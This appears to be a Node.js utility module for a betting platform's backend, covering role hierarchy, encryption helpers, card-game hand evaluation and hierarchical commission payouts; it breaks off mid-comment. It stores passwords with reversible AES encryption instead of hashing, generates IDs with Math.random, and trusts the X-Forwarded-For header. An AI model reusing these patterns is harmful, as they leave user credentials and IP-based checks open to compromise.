const { getUser, getUserById, User } = require("./../apis/users/users.helper");
const axios = require("axios");
const messages = require("../helpers/constants/message");
const crypto = require("crypto");
const CryptoJS = require("crypto-js");
const SECRET_KEY = process.env.ENCRYPT_KEY;
const OUR_SECRET_KEY = process.env.OUR_ENCRYPT_KEY;
const JSK_SECRET_KEY = process.env.JSK_ENCRYPT_KEY;
const JSK_KEY = process.env.JSK_KEY;
const JSK_SERVER_URL = process.env.JSK_SERVER_URL;
const http = require("http");
const https = require("https");
const { URL } = require("url");
const fs = require("fs");
const path = require("path");
const {
  findPartnershipByUserAndPartner,
} = require("../apis/partnership/partnership.helper");
const partnershipModel = require("../apis/partnership/partnership.model");
const ROLE_HIERARCHY = [
  "owner", // 0
  "super-admin", // 1
  "admin", // 2
  "sub-admin", // 3
  "super-master", // 4
  "master", // 5
  "user", // 6
];

function canCreateRole(creatorRole, newRole) {
  const creatorIndex = ROLE_HIERARCHY.indexOf(creatorRole);
  const newRoleIndex = ROLE_HIERARCHY.indexOf(newRole);

  if (creatorIndex === -1 || newRoleIndex === -1) return false;

  if (creatorRole === "owner") return true;

  return newRoleIndex > creatorIndex;
}
const getCommissionDistribution = async (userId) => {
  const distributions = [];
  let currentUser = await getUser({ _id: userId });
  while (currentUser) {
    distributions.push({
      username: currentUser.username,
      role: currentUser.role,
      commission: currentUser.commission,
    });
    if (!currentUser.parent) break;
    currentUser = await getUser({ _id: currentUser.parent });
  }
  return distributions;
};
const generateUUID = (length = 4, options = { numericOnly: false }) => {
  let text = "";
  const possible =
    options && options.numericOnly
      ? "0123456789"
      : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  // eslint-disable-next-line no-plusplus
  for (let i = 0; i < length; i++) {
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  }
  return text;
};

// AES-256-CBC Constants
const ALGORITHM = 'aes-256-cbc';
const IV_LENGTH = 16; // For AES, this is always 16 bytes

// Derive a 32-byte key from the secret using SHA-256
// This ensures the key is always the correct length for AES-256
const getKey = (secret) => crypto.createHash('sha256').update(String(secret)).digest();

const encryptData = (data) => {
  const iv = crypto.randomBytes(IV_LENGTH);
  const key = getKey(SECRET_KEY);
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
  let encrypted = cipher.update(JSON.stringify(data));
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  // Return format: IV:EncryptedData
  return iv.toString('hex') + ':' + encrypted.toString('hex');
};

const decryptData = (ciphertext) => {
  try {
    const textParts = ciphertext.split(':');
    if (textParts.length !== 2) {
      console.error("Invalid ciphertext format");
      return null;
    }
    const iv = Buffer.from(textParts.shift(), 'hex');
    const encryptedText = Buffer.from(textParts.join(':'), 'hex');
    const key = getKey(SECRET_KEY);
    const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
    let decrypted = decipher.update(encryptedText);
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return JSON.parse(decrypted.toString());
  } catch (e) {
    console.error("Decryption failed:", e.message);
    return null;
  }
};

const compareData = (plainData, encryptedData) => {
  try {
    const decrypted = decryptData(encryptedData);
    return plainData === decrypted;
  } catch (e) {
    return false;
  }
};

const encryptPassword = (data) => {
  const iv = crypto.randomBytes(IV_LENGTH);
  const key = getKey(OUR_SECRET_KEY);
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
  let encrypted = cipher.update(JSON.stringify(data));
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
};

const decryptPassword = (ciphertext) => {
  try {
    const textParts = ciphertext.split(":");
    if (textParts.length !== 2) {
      console.error("Invalid ciphertext format");
      return null;
    }
    const iv = Buffer.from(textParts.shift(), "hex");
    const encryptedText = Buffer.from(textParts.join(":"), "hex");
    const key = getKey(OUR_SECRET_KEY);
    const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
    let decrypted = decipher.update(encryptedText);
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return JSON.parse(decrypted.toString());
  } catch (e) {
    console.error("Decryption failed:", e.message);
    return null;
  }
};

const comparePassword = (plainData, encryptedData) => {
  try {
    const decrypted = decryptPassword(encryptedData);
    return plainData === decrypted;
  } catch (e) {
    return false;
  }
};

const parseArrayIfExist = (val) => {
  if (!val) {
    return [];
  } else {
    if (typeof val == "string") {
      try {
        return JSON.parse(val);
      } catch (e) {
        return false;
      }
    } else {
      return [];
    }
  }
};
const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

const jskEncryptData = (data) => {
  return CryptoJS.AES.encrypt(JSON.stringify(data), JSK_SECRET_KEY).toString();
};

const jskDecryptData = (ciphertext) => {
  const bytes = CryptoJS.AES.decrypt(ciphertext, JSK_SECRET_KEY);
  const decrypted = bytes.toString(CryptoJS.enc.Utf8);
  return JSON.parse(decrypted);
};
async function apiRequest({ url, data = {}, apiAction = "post", noEncrypt, host = "" }) {
  try {
    const encrypt = encryptData(data);
    const hostUrl = host ? host : JSK_SERVER_URL;
    const config = {
      method: apiAction,
      url: `${hostUrl}/${url}`,
      headers: {
        "Content-Type": "application/json",
        // "X-Internal-Secret": process.env.INTERNAL_SECRET,
      },
      ...(apiAction.toLowerCase() === "get"
        ? { params: data }
        : { data: encrypt }),
      timeout: 10000, // 10s timeout
    };


    const shouldLog =url.includes("/getPriveteData");



    const res = await axios(config);

  if (shouldLog) {


    if (Array.isArray(res.data?.data)) {

    } else {

    }

    console.log("==============================\n");
  }

    let responseData = res.data;
    if (!res || res.status !== 200) {
      throw new Error(
        `API Error: ${responseData?.msg || res.status || "Unknown error"}`
      );
    }
    if (noEncrypt) {
      return { data: responseData.data };
    }
    const decrypt = decryptData(responseData?.data);
    return { data: decrypt };
  } catch (e) {

    const status = e.response?.status || 500;
    const method = e.config?.method?.toUpperCase() || "POST";
    const requestUrl = e.config?.url || "Unknown";



    throw e;
  }
}
function normalizeNat(nat, subtype) {
  if (subtype === "Player") return nat;
  if (subtype === "Pair") return nat.replace("Pair Plus", "").trim();
  if (subtype === "Khal") return nat.replace("3 Baccarat", "Player").trim();
  if (subtype === "Bacc" || subtype === "Baccarat")
    return nat.replace("3 Baccarat", "Player").trim();
  if (subtype === "RedBlack")
    return nat.replace(/(Black|Red)\s([AB])/, "$2 : $1");
  if (subtype === "Total") return nat.replace("Total", "Player").trim();
  return nat;
}

const isScoreWin = (sectionName, scoreResult) => {
  const ranges = {
    "Score 1-4": [1, 4],
    "Score 5-6": [5, 6],
    "Score 7": [7, 7],
    "Score 8": [8, 8],
    "Score 9": [9, 9],
  };
  const [min, max] = ranges[sectionName] || [];
  const score = Number(scoreResult);
  return score >= min && score <= max;
};

const normalizeIp = (ip) => {
  if (!ip) return null;
  // remove IPv6 prefix like ::ffff:
  return ip.replace(/^::ffff:/, "");
};

const getClientIp = (req) => {

  //  console.log("=== ++++IP DEBUG++++++++ ===");
  // console.log("x-forwarded-for:", req.headers["x-forwarded-for"]);
  // console.log("x-real-ip:", req.headers["x-real-ip"]);
  // console.log("req.ip:", req.ip);
  // console.log("remoteAddress:", req.socket?.remoteAddress);

  const xff = req.headers["x-forwarded-for"];
  if (xff) {
    const first = String(xff).split(",")[0].trim();
    return normalizeIp(first);
  }

  if (req.headers["x-real-ip"]) {
    return normalizeIp(req.headers["x-real-ip"]);
  }

  if (req.ip) {
    return normalizeIp(req.ip);
  }

  return normalizeIp(req.socket && req.socket.remoteAddress);
};

const rouletteNumbers = () => {
  const rouletteNumbers = {};

  for (let num = 0; num <= 36; num++) {
    let color = "Green";
    if (num !== 0) {
      const reds = [
        1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36,
      ];
      color = reds.includes(num) ? "Red" : "Black";
    }

    // dozen
    let dozen = null;
    if (num >= 1 && num <= 12) dozen = "1st 12";
    else if (num >= 13 && num <= 24) dozen = "2nd 12";
    else if (num >= 25 && num <= 36) dozen = "3rd 12";

    // column
    let column = null;
    if (num !== 0) {
      if (num % 3 === 1) column = "1st Column";
      else if (num % 3 === 2) column = "2nd Column";
      else column = "3rd Column";
    }

    // low/high
    let range = null;
    if (num >= 1 && num <= 18) range = "1 to 18";
    else if (num >= 19 && num <= 36) range = "19 to 36";

    rouletteNumbers[num] = {
      color,
      oddEven: num === 0 ? null : num % 2 === 0 ? "Even" : "Odd",
      dozen,
      column,
      range,
    };
  }

  return rouletteNumbers;
};

function cardValue(card) {
  const rank = card.slice(0, -2);
  const values = {
    A: 14,
    K: 13,
    Q: 12,
    J: 11,
    10: 10,
    9: 9,
    8: 8,
    7: 7,
    6: 6,
    5: 5,
    4: 4,
    3: 3,
    2: 2,
  };
  return values[rank];
}

function parseHand(cards) {
  return cards
    .map((c) => ({
      value: cardValue(c),
      suit: c.slice(-2),
    }))
    .sort((a, b) => b.value - a.value);
}

function evaluateHand(cards) {
  const hand = parseHand(cards);
  const values = hand.map((c) => c.value);
  const suits = hand.map((c) => c.suit);

  const isFlush = suits.every((s) => s === suits[0]);
  const isSequence = values[0] - values[2] === 2 && new Set(values).size === 3;

  const counts = values.reduce((acc, v) => {
    acc[v] = (acc[v] || 0) + 1;
    return acc;
  }, {});
  const countsArr = Object.entries(counts).sort(
    (a, b) => b[1] - a[1] || b[0] - a[0]
  );

  let rank;
  if (countsArr[0][1] === 3) rank = 6;
  else if (isSequence && isFlush) rank = 5;
  else if (isSequence) rank = 4;
  else if (isFlush) rank = 3;
  else if (countsArr[0][1] === 2) rank = 2;
  else rank = 1;

  const sortedValues = countsArr.flatMap(([v, count]) =>
    Array(count).fill(Number(v))
  );
  return { rank, values: sortedValues.sort((a, b) => b - a) };
}

function compareHands(player1, player2) {
  const h1 = evaluateHand(player1);
  const h2 = evaluateHand(player2);

  if (h1.rank > h2.rank) return "Player 1";
  if (h2.rank > h1.rank) return "Player 2";

  // same rank → compare sorted values
  for (let i = 0; i < h1.values.length; i++) {
    if (h1.values[i] > h2.values[i]) return "Player 1";
    if (h2.values[i] > h1.values[i]) return "Player 2";
  }
  return "Tie";
}
function generateFullDeck() {
  const ranks = [
    "A",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "J",
    "Q",
    "K",
  ];
  const suits = ["SS", "DD", "CC", "HH"];
  const deck = [];

  for (const r of ranks) {
    for (const s of suits) {
      deck.push(`${r}${s}`);
    }
  }

  return deck;
}
function parseCardValue(card) {
  const rank = card.length > 2 ? card.slice(0, -2) : card;
  const values = { A: 1, J: 11, Q: 12, K: 13 };
  if (!isNaN(rank)) return parseInt(rank, 10);
  return values[rank.toUpperCase()] || 0;
}

function mapValueToRank(value) {
  switch (value) {
    case 1:
      return "A";
    case 11:
      return "J";
    case 12:
      return "Q";
    case 13:
      return "K";
    default:
      return value.toString();
  }
}
function parseCardGroup(group) {
  if (!group) return [];

  group = group.trim();

  const presets = {
    A23: ["A", "2", "3"],
    456: ["4", "5", "6"],
    78910: ["7", "8", "9", "10"],
    JQK: ["J", "Q", "K"],
  };

  if (presets[group]) return presets[group];

  return group
    .replace(/,/g, " ")
    .split(/\s+/)
    .map((v) => v.trim())
    .filter(Boolean);
}

const deleteFile = (relativePath) => {
  const imagesRoot = path.join(__dirname, "..", "uploads");
  if (relativePath.startsWith("/uploads/")) {
    relativePath = relativePath.replace("/uploads/", "");
  }

  const filePath = path.join(imagesRoot, relativePath);

  if (!filePath.startsWith(imagesRoot)) {
    console.error("Attempt to delete outside uploads folder:", filePath);
    return;
  }

  if (fs.existsSync(filePath)) {
    fs.unlink(filePath, (err) => {
      if (err) console.error("Error deleting file:", err);
      else console.log("File deleted:", filePath);
    });
  } else {
    console.log("File does not exist:", filePath);
  }
};

const tieGameCondition = {
  lucky5: ["High Card", "Low Card"],
  lucky7eu2: ["High Card", "Low Card"],
  lucky7eu: ["High Card", "Low Card"],
  lucky7: ["High Card", "Low Card"],
  plucky7: ["High Card", "Low Card"],
  tlucky7: ["High Card", "Low Card"],
  poison: ["Player A", "Player B"],
  teen20c: ["Player A", "Player B"],
  teen20b: ["Player A", "Player B"],
  teen20: ["Player A", "Player B"],
  pteen20: ["Player A", "Player B"],
  tteen20: ["Player A", "Player B"],
};

function getCardRanks(cards) {
  const rankMap = { A: 1, J: 11, Q: 12, K: 13 };

  return cards.map((card) => {
    const rankStr = card.slice(0, -2).toUpperCase();
    return rankMap[rankStr] || parseInt(rankStr, 10);
  });
}

function checkJokerResult(resultData, bet, section) {
  const fullDeck = generateFullDeck();
  let updateStatus = null;

  const cards = resultData?.card?.split(",")?.map((s) => s.trim()) || [];
  const playerA = cards.filter((_, i) => i % 2 === 0);
  const playerB = cards.filter((_, i) => i % 2 === 1);

  let selectedPlayerCards, otherPlayerCards;
  if (section === "Player A") {
    selectedPlayerCards = playerA;
    otherPlayerCards = playerB;
  } else {
    selectedPlayerCards = playerB;
    otherPlayerCards = playerA;
  }

  const selectedCard = bet?.selected;
  let jokerSet = new Set();
  if (selectedCard) {
    const suits = ["SS", "DD", "CC", "HH"];
    const values = { 1: "A", 13: "K", 12: "Q", 11: "J" };
    suits.forEach((suit) => {
      jokerSet.add(`${values?.[Number(selectedCard)] ?? selectedCard}${suit}`);
    });
  }

  function expandHandWithJokers(hand) {
    let hands = [hand];
    for (let i = 0; i < hand.length; i++) {
      if (jokerSet.has(hand[i])) {
        let newHands = [];
        for (const candidate of fullDeck) {
          if (cards.includes(candidate)) continue;
          for (const h of hands) {
            const replaced = [...h];
            replaced[i] = candidate;
            newHands.push(replaced);
          }
        }
        hands = newHands;
      }
    }
    return hands;
  }

  const playerAHands = expandHandWithJokers(playerA);
  const playerBHands = expandHandWithJokers(playerB);

  let bestResult = null;

  // check all combinations of hands
  for (const handA of playerAHands) {
    for (const handB of playerBHands) {
      const result = compareHands(handA, handB);

      if (section === "Player A") {
        if (result === "Player 1") {
          updateStatus = "won";
          return updateStatus;
        }
      } else {
        if (result === "Player 2") {
          updateStatus = "won";
          return updateStatus;
        }
      }

      if (!bestResult) {
        bestResult = result;
      } else if (bestResult === "Tie" && result !== "Tie") {
        bestResult = result;
      }
    }
  }

  if (!updateStatus) {
    updateStatus =
      bestResult === "Player 1"
        ? section === "Player A"
          ? "won"
          : "lost"
        : bestResult === "Player 2"
          ? section === "Player B"
            ? "won"
            : "lost"
          : "tie";
  }

  return updateStatus;
}

const parseMatchDate = (stimeStr) => {
  if (!stimeStr) return null;

  const [datePart, timePart] = stimeStr.split(" ");
  if (!datePart || !timePart) return null;

  const [month, day, year] = datePart.split("/").map(Number);
  const [hours, minutes, seconds] = timePart.split(":").map(Number);

  return new Date(year, month - 1, day, hours, minutes, seconds);
};

const filterBetsByDate = (bets, startDate, endDate) => {
  return bets.filter((bet) => {
    const stimeStr = bet.matchData?.stime;
    const stimeDate = parseMatchDate(stimeStr);
    if (!stimeDate) return false;

    return stimeDate >= startDate && stimeDate <= endDate;
  });
};
async function distributeCommissionHierarchy(user, amounts, options = {}) {
  const { session = null } = options;
  const User = require("../apis/users/users.model");
  const { createExposureLog } = require("../apis/userLog/userLog.helper");

  if (!user?.parent) return;

  let childUser = user;
  let currentParentId = user.parent;

  while (currentParentId) {
    try {
      const parentUser = await User.findById(currentParentId).session(session);
      if (!parentUser) {
        console.warn(`[Exposure] Parent not found: ${currentParentId} for child ${childUser.username}`);
        break;
      }

      // Safeguard: If childUser.role is missing, fetch it to prevent formula flipping
      if (!childUser.role) {
        const freshChild = await User.findById(childUser._id).select("role username").session(session).lean();
        if (freshChild) childUser.role = freshChild.role;
      }

      const partnershipModel = require("../apis/partnership/partnership.model");
      let partnershipEntry = await partnershipModel.findOne({ userId: childUser._id, partnerId: parentUser._id }).session(session);

      if (!partnershipEntry) {
        partnershipEntry = await partnershipModel.findOne({ userId: parentUser._id, partnerId: childUser._id }).session(session);
      }

      let commissionPercent = 0;
      if (partnershipEntry) {
        commissionPercent = Number(partnershipEntry.commission ?? 0);
      } else {
        commissionPercent = childUser.role === 'user' ? 100 : 0;
      }

      if (amounts.exp) {
        const isUserRole = ['user'].includes(childUser.role);
        let parentSharePercent = isUserRole ? commissionPercent : (100 - commissionPercent);
        
        // CRITICAL FIX: Use originalUserDelta to avoid compounded percentage shrinking
        const originalUserDelta = amounts.originalExp !== undefined ? amounts.originalExp : amounts.exp;
        const commissionExp = Number(((originalUserDelta * parentSharePercent) / 100).toFixed(2));

        // Store original for next level if not already done
        if (amounts.originalExp === undefined) amounts.originalExp = amounts.exp;

        const { atomicUpdateUserFinance } = require("./finance.helper");
        let updatedParent = await atomicUpdateUserFinance(
            parentUser._id, 
            { exp: commissionExp }, 
            { allowNegativeBuffer: true } 
        );

        if (!updatedParent) {
          console.error(`[CRITICAL] Failed to update parent ${parentUser.username} exposure! User: ${user.username}, Delta: ${commissionExp}`);
        } else {
          // Move to next parent using the updated parent's object
          parentUser.exp = Number(updatedParent.exp) || 0;
        }
      }

      childUser = parentUser;
      currentParentId = parentUser.parent;
    } catch (err) {
      console.error(`[Exposure Error] Propagation failed at parent ${currentParentId}:`, err.message);
      break;
    }
  }
}
const { atomicUpdateUserFinance } = require("./finance.helper");
const Transaction = require("../apis/transaction/transaction.model");

// async function distributeBettingCommissionHierarchy(
//   user,
//   {
//     gameId,
//     marketId,
//     bets,
//   },
//   options = {}
// ) {
//   const { session = null } = options;

//   if (!user || !bets?.length) return;

//   console.log("[Bet Commission] START", {
//   userId: user._id?.toString(),
//   username: user.username,
//   parentId: user.parent?.toString(),
//   gameId,
//   marketId,
//   bets: bets.map((bet) => ({
//     id: bet._id?.toString(),
//     gType: bet.gType,
//     marketName: bet.marketName,
//     betType: bet.betType,
//     amount: bet.amount,
//     status: bet.status,
//     profit: bet.profit,
//   })),
// });

//   const User = require("../apis/users/users.model");
//   const Partnership = require("../apis/partnership/partnership.model");

//   /*
//    * ------------------------------------------------------------
//    * DETERMINE CATEGORY
//    * ------------------------------------------------------------
//    */

//   const isFancy = bets.some((bet) => {
//     const gType = String(bet.gType || "").toLowerCase();
//     const sectionName = String(bet.sectionName || "").toLowerCase();

//     return (
//       gType === "fancy" ||
//       (
//         gType === "fancy1" &&
//         !sectionName.includes("will win the toss")
//       )
//     );
//   });

//   const isBookmaker = bets.some((bet) =>
//     String(bet.gType || "").toLowerCase() === "match1"
//   );

//   console.log("[Bet Commission] CATEGORY", {
//   isFancy,
//   isBookmaker,
//   gTypes: bets.map((bet) => bet.gType),
// });

//   let category;

//   if (isFancy) {
//     category = "fancy";
//   } else if (isBookmaker) {
//     category = "bookmaker";
//   } else {
//     return;
//   }

//   console.log("[Bet Commission] CATEGORY SELECTED", {
//   category,
// });

//   /*
//    * ------------------------------------------------------------
//    * FIND PARTNERSHIP
//    * ------------------------------------------------------------
//    */

//   const getPartnership = async (
//     childId,
//     parentId
//   ) => {
//     let partnership = await Partnership.findOne({
//       userId: childId,
//       partnerId: parentId,
//     }).session(session);

//     if (!partnership) {
//       partnership = await Partnership.findOne({
//         userId: parentId,
//         partnerId: childId,
//       }).session(session);
//     }

//     return partnership;
//   };



//   /*
//    * ------------------------------------------------------------
//    * BUILD HIERARCHY
//    * ------------------------------------------------------------
//    *
//    * Example:
//    *
//    * User      = ENTRY_WISE 10%
//    * Parent    = ENTRY_WISE 12%
//    * Grandparent = ENTRY_WISE 15%
//    *
//    * We collect:
//    *
//    * User -> Parent       10%
//    * Parent -> Grandparent 12%
//    * Grandparent -> Owner  15%
//    *
//    * Then distribute the differences:
//    *
//    * Parent       = 12 - 10 = 2%
//    * Grandparent  = 15 - 12 = 3%
//    */

//   const hierarchy = [];

//   let childUser = user;
//   let currentParentId = user.parent;

//   while (currentParentId) {
//     const parentUser = await User.findById(
//       currentParentId
//     )
//       .select("_id username parent role")
//       .session(session);

//     if (!parentUser) {
//       console.warn(
//         `[Bet Commission] Parent not found: ${currentParentId}`
//       );
//       break;
//     }

//     const partnership = await getPartnership(
//       childUser._id,
//       parentUser._id
//     );
//       console.log("[Bet Commission] PARTNERSHIP RESULT", {
//   found: !!partnership,
//   partnershipId: partnership?._id?.toString(),
//   bookmakerCommission: partnership?.bookmakerCommission,
//   fancyCommission: partnership?.fancyCommission,
// });

//     if (!partnership) {
//       console.warn(
//         `[Bet Commission] Partnership not found: ${childUser._id} -> ${parentUser._id}`
//       );

//       childUser = parentUser;
//       currentParentId = parentUser.parent;
//       continue;
//     }

//     const commissionConfig =
//       category === "fancy"
//         ? partnership.fancyCommission
//         : partnership.bookmakerCommission;

//     const commissionType =
//       commissionConfig?.type || "NONE";

//     const percentage = Number(
//       commissionConfig?.percentage || 0
//     );

//     hierarchy.push({
//       child: childUser,
//       parent: parentUser,
//       commissionType,
//       percentage,
//     });

//     childUser = parentUser;
//     currentParentId = parentUser.parent;
//   }

//   if (!hierarchy.length) return;

//   console.log("[Bet Commission] HIERARCHY", {
//   hierarchy: hierarchy.map((level) => ({
//     child: level.child.username,
//     parent: level.parent.username,
//     commissionType: level.commissionType,
//     percentage: level.percentage,
//   })),
// });

//   let activeCommissionType = null;

// for (const level of hierarchy) {
//   const currentPercentage =
//     Number(level.percentage || 0);

//   if (
//     level.commissionType === "NONE" ||
//     currentPercentage <= 0
//   ) {
//     break;
//   }

//   if (!activeCommissionType) {
//     activeCommissionType =
//       level.commissionType;
//     continue;
//   }

//   if (
//     level.commissionType !==
//     activeCommissionType
//   ) {
//     console.warn(
//       "[Bet Commission] Invalid commission hierarchy",
//       {
//         gameId,
//         marketId,
//         category,
//         childId: level.child._id,
//         parentId: level.parent._id,
//         expectedType: activeCommissionType,
//         actualType: level.commissionType,
//       }
//     );

//     return;
//   }
// }

//   /*
//    * ------------------------------------------------------------
//    * VALIDATE COMMISSION TYPE HIERARCHY
//    * ------------------------------------------------------------
//    *
//    * If child is NET_LOOSING:
//    *
//    * Parent MUST also be NET_LOOSING.
//    *
//    * If child is ENTRY_WISE:
//    *
//    * Parent MUST also be ENTRY_WISE.
//    *
//    * NONE is treated as 0 and does not create commission.
//    */


//   /*
//  * ------------------------------------------------------------
//  * DISTRIBUTE COMMISSION
//  * ------------------------------------------------------------
//  *
//  * Each relationship transfers the FULL percentage configured
//  * for that child.
//  *
//  * Example:
//  *
//  * User      = 10%
//  * Parent    = 12%
//  * Grandparent = 15%
//  *
//  * Parent receives 10% from Grandparent
//  * Grandparent receives 12% from Owner
//  *
//  * Therefore:
//  *
//  * Parent:
//  *   +10% from Grandparent
//  *   -10% to User
//  *   = 0% net
//  *
//  * Grandparent:
//  *   +12% from Owner
//  *   -10% to Parent
//  *   = +2% net
//  *
//  * The difference is created naturally by the transfers.
//  */

// for (const level of hierarchy) {
//   const currentPercentage =
//     Number(level.percentage || 0);

//   if (
//     level.commissionType === "NONE" ||
//     currentPercentage <= 0
//   ) {
//     break;
//   }

//   /*
//    * Calculate the commission BASE only.
//    *
//    * percentage = 100 means we only want the base,
//    * not the final commission amount.
//    */
//   const { commissionBase } =
//     calculateBettingCommission({
//       bets,
//       category,
//       commissionType:
//         level.commissionType,
//       percentage: 100,
//     });

//   console.log("[Bet Commission] BASE CALCULATED", {
//   category,
//   commissionType: level.commissionType,
//   commissionBase,
//   bets: bets.map((bet) => ({
//     amount: bet.amount,
//     status: bet.status,
//     profit: bet.profit,
//   })),
// });

//   if (commissionBase <= 0) {
//     continue;
//   }

//   /*
//    * FULL percentage configured for this relationship.
//    */
//   const commissionAmount = Number(
//     (
//       commissionBase *
//       currentPercentage /
//       100
//     ).toFixed(2)
//   );

//   if (commissionAmount <= 0) {
//     continue;
//   }

//   /*
//    * level.parent = PAYER
//    * level.child  = RECEIVER
//    */
//   const payer = level.parent;
//   const receiver = level.child;

//   /*
//    * Get payer's balance BEFORE deduction.
//    *
//    * This is only used for the account statement.
//    */
//   const payerBefore = await User.findById(
//       payer._id
//     )
//       .select("balance")
//       .session(session);

//     if (!payerBefore) {
//       throw new Error(
//         `[Bet Commission] Payer not found: ${payer._id}`
//       );
//     }

//     const payerBalanceBefore =
//       Number(payerBefore.balance || 0);

//     /*
//     * ------------------------------------------------------------
//     * DEDUCT FROM PARENT
//     * ------------------------------------------------------------
//     */
//     const updatedPayer =
//       await atomicUpdateUserFinance(
//         payer._id,
//         {
//           balance: -commissionAmount,
//         },
//         {
//           session,
//           allowNegativeBuffer: false,
//         }
//       );

//     if (!updatedPayer) {
//       throw new Error(
//         `[Bet Commission] Failed to deduct ${commissionAmount} from ${payer.username}`
//       );
//     }

//     /*
//     * ------------------------------------------------------------
//     * CREDIT CHILD
//     * ------------------------------------------------------------
//     */
//     const updatedReceiver =
//       await atomicUpdateUserFinance(
//         receiver._id,
//         {
//           balance: commissionAmount,
//         },
//         {
//           session,
//           allowNegativeBuffer: false,
//         }
//       );

//     if (!updatedReceiver) {
//       throw new Error(
//         `[Bet Commission] Failed to credit ${commissionAmount} to ${receiver.username}`
//       );
//     }

//     /*
//     * ------------------------------------------------------------
//     * ACCOUNT STATEMENT
//     * ------------------------------------------------------------
//     *
//     * Only the payer gets a transaction because you want
//     * the statement to show the amount deducted because
//     * of commission.
//     */
//     const receiverBalanceBefore = Number(
//       updatedReceiver.balance || 0
//     ) - commissionAmount;

//     const bet = bets?.[0] || {};

//     const transactionRemark = [
//       bet.eventName,
//       bet.marketName,
//       bet.sectionName,
//       bet.winner ?? bet.run,
//       "Commission",
//     ]
//       .filter(
//         (value) =>
//           value !== undefined &&
//           value !== null &&
//           String(value).trim() !== ""
//       )
//       .map((value) => String(value).trim())
//       .join(" | ");

//     await Transaction.create(
//       [
//         // Payer: commission deducted
//         {
//           userId: payer._id,
//           type: "commission",
//           amount: -commissionAmount,
//           balanceBefore: payerBalanceBefore,
//           balanceAfter: Number(updatedPayer.balance || 0),
//           createdBy: receiver._id,
//           status: "approved",
//           remarks: transactionRemark,
//         },

//         // Receiver: commission received
//         {
//           userId: receiver._id,
//           type: "commission",
//           amount: commissionAmount,
//           balanceBefore: receiverBalanceBefore,
//           balanceAfter: Number(updatedReceiver.balance || 0),
//           createdBy: payer._id,
//           status: "approved",
//           remarks: transactionRemark,
//         },
//       ],
//       session ? { session } : {}
//     );

//     console.log(
//       "[Bet Commission Transfer]",
//       {
//         gameId,
//         marketId,
//         category,

//         commissionType:
//           level.commissionType,

//         payer: payer.username,
//         receiver: receiver.username,

//         percentage: currentPercentage,

//         commissionBase,
//         commissionAmount,
//       }
//     );
//   }
// }

async function distributeBettingCommissionHierarchy(
  user,
  {
    gameId,
    marketId,
    bets,
  },
  options = {}
  ) {
  const { session = null } = options;

  if (!user || !bets?.length) return;

  const commissionBets = bets.filter(
    (bet) => Number(bet.etid) === 4 &&
    (bet.iscc === undefined || Number(bet.iscc) === 0)
  );

  const betIds = commissionBets.map((bet) => bet._id);

  if (!commissionBets.length) {
    console.log("[Bet Commission] No ETID 4 bets, skipping commission", {
      gameId,
      marketId,
      etids: bets.map((bet) => bet.etid),
    });

    return;
  }

  console.log("[Bet Commission] START", {
    userId: user._id?.toString(),
    username: user.username,
    parentId: user.parent?.toString(),
    gameId,
    marketId,
    bets: bets.map((bet) => ({
      id: bet._id?.toString(),
      gType: bet.gType,
      marketName: bet.marketName,
      betType: bet.betType,
      amount: bet.amount,
      status: bet.status,
      profit: bet.profit,
    })),
  });

  const User = require("../apis/users/users.model");
  const Partnership = require("../apis/partnership/partnership.model");

  /*
   * ------------------------------------------------------------
   * DETERMINE CATEGORY
   * ------------------------------------------------------------
   */

  const isFancy = bets.some((bet) => {
    const gType = String(bet.gType || "").toLowerCase();
    const sectionName = String(bet.sectionName || "").toLowerCase();

    return (
      gType === "fancy" ||
      (
        gType === "fancy1" &&
        !sectionName.includes("will win the toss")
      )
    );
  });

  const isBookmaker = bets.some((bet) => {
    const gType = String(bet.gType || "").toLowerCase();
    const marketName = String(bet.marketName || "").toLowerCase();

    return (
      gType === "match1" &&
      (marketName === "bookmaker" || marketName === "bookmaker 2")
    );
  });

  console.log("[Bet Commission] CATEGORY", {
    isFancy,
    isBookmaker,
    gTypes: bets.map((bet) => bet.gType),
  });

  let category;

  if (isFancy) {
    category = "fancy";
  } else if (isBookmaker) {
    category = "bookmaker";
  } else {
    return;
  }

  console.log("[Bet Commission] CATEGORY SELECTED", {
    category,
  });

  /*
   * ------------------------------------------------------------
   * FIND PARTNERSHIP
   * ------------------------------------------------------------
   */

  const getPartnership = async (
    childId,
    parentId
  ) => {
    let partnership = await Partnership.findOne({
      userId: childId,
      partnerId: parentId,
    }).session(session);

    if (!partnership) {
      partnership = await Partnership.findOne({
        userId: parentId,
        partnerId: childId,
      }).session(session);
    }

    return partnership;
  };

  const normalizeCommission = (commission) => {
    if (!commission) {
      return [];
    }

    // New array format
    if (Array.isArray(commission)) {
      return commission;
    }

    // Old object format - temporary backward compatibility
    return [commission];
  };



  /*
   * ------------------------------------------------------------
   * BUILD HIERARCHY
   * ------------------------------------------------------------
   *
   * Example:
   *
   * User      = ENTRY_WISE 10%
   * Parent    = ENTRY_WISE 12%
   * Grandparent = ENTRY_WISE 15%
   *
   * We collect:
   *
   * User -> Parent       10%
   * Parent -> Grandparent 12%
   * Grandparent -> Owner  15%
   *
   * Then distribute the differences:
   *
   * Parent       = 12 - 10 = 2%
   * Grandparent  = 15 - 12 = 3%
   */

  /*
  * ------------------------------------------------------------
  * BUILD HIERARCHY
  * ------------------------------------------------------------
  *
  * IMPORTANT:
  *
  * Only normal users place bets.
  * A user has ONE commission type for the category.
  *
  * Example:
  *
  * User:
  *   ENTRY_WISE 10%
  *
  * Parent:
  *   ENTRY_WISE 15%
  *   ENTRY_LOOSING 10%
  *
  * Grandparent:
  *   ENTRY_WISE 20%
  *   NET_LOOSING 15%
  *
  * For this user's ENTRY_WISE bet, only ENTRY_WISE is used
  * throughout the hierarchy.
  *
